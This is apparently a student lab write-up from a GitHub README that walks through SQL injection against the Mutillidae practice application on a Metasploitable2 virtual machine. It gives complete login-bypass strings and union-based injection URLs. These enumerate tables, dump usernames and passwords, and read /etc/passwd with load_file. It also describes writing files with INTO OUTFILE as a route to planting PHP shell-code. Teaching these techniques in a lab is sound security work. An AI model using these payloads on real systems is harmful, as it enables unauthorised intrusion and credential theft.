# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/aff679eb-15fa-4b32-ad63-f84698fe68fd)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/02ef01aa-ce80-40e4-9319-85d1b61c3b2b)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/e4df8614-3bc1-42ab-a32d-c4626319de7e)

Click on the menu Login/Register and register for an account

![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/d368688f-c054-4261-9460-4eb9566a9b33)

Click on the link “Please register here”
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/e71151a7-86d0-41a6-a9f1-5810afb5481e)

Click on “Create Account” to display the following page:
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/54eeb3e5-5141-4560-b3c7-e283931ae3a5)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/57d989f3-90e1-433a-ac5b-6962939e595c)

Click “Login”. The logged in page will show as below: 
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/c7619c90-4741-46fd-9ffd-3c88c5d07f70)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/a770350e-018f-4100-9216-1789471280cb)

Click the login button and you will see it enter into the administrator page.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/2b95910d-5dc2-401b-9074-78d794a55944)

Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info

After logging out, Now choose the menu as shown below:
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/f1e9c978-4c88-48a2-ab10-92999abba97c)

![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/124908a6-111a-49b7-a478-41790832dd3b)

![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/13aa5f07-2ec6-423e-a142-e6a73372b67e)

![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/e221f697-e759-4e80-8270-640deefe7b66)

![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/f023ff24-aa92-420a-82bc-b4679f7d6fb8)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/2bced6f2-4395-44fc-aafd-e0610242d555)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/f23d6d75-4dd8-40be-a61d-5387f8fd8e7d)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/3e231994-e2d2-4715-a81c-36eefdce7004)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/fa40bbec-2330-4200-be98-7674f3934a02)

As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/dd857e9b-b1b7-456a-a35d-729c2db9063e)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/07ecece6-104a-473e-a11b-da51c98ad9ef)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/39a94820-ef46-481d-bb57-18159ec68e78)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/7e766ef8-a213-4cc2-bd14-f380908f1f15)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/2779287a-3e4a-49fc-8f65-d44fa96150c7)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/db1d61b4-6db3-41d4-8a87-82f5dba85493)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/3e1b03f8-2101-4069-a7c7-ad54f84ff8f2)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/39ddc2b2-833f-48d0-b582-cb8427e105cc)

Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/LakshmanAdhireddy/sqlinjection/assets/118707265/eea228a5-0551-4e9b-8888-ec0a1fadd1ac)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:

The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
